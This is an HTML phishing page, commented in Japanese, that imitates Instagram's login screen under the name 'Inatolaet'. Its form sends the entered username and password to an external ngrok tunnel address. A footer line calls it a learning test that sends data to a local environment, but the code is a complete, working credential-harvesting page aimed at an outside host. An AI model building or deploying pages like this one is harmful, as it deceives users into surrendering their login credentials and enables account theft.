<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inatolaet Login Test</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column; /* 要素を縦に並べる */
        }

        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 40px;
            box-sizing: border-box;
            text-align: center;
        }

        .logo {
            font-size: 40px;
            font-weight: bold;
            margin-bottom: 30px;
            font-style: italic;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 10px;
            margin-bottom: 10px;
            font-size: 12px;
        }

        button {
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 7px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }

        .signup-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            margin-top: 10px;
            padding: 20px;
            box-sizing: border-box;
            text-align: center;
            font-size: 14px;
        }

        /* 追加した免責事項のスタイル */
        .disclaimer {
            font-size: 11px;
            color: #8e8e8e;
            text-align: center;
            margin-top: 20px;
            line-height: 1.5;
            max-width: 350px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo">Inatolaet</div>
        
        <!-- URLの末尾が /login になっているか確認 -->
        <form action="https://ea4f66046a74.ngrok-free.app/login" method="POST">
            <input type="text" name="username" placeholder="ユーザー名" required>
            <input type="password" name="password" placeholder="パスワード" required>
            <button type="submit">ログイン</button>
        </form>
    </div>

    <div class="signup-box">
        アカウントをお持ちでないですか？ <a href="#">登録する</a>
    </div>

    <!-- ここに免責事項を追加 -->
    <div class="disclaimer">
        <br>
        This is a test page for learning purposes only. Data is sent to a local environment.
    </div>

</body>
</html>
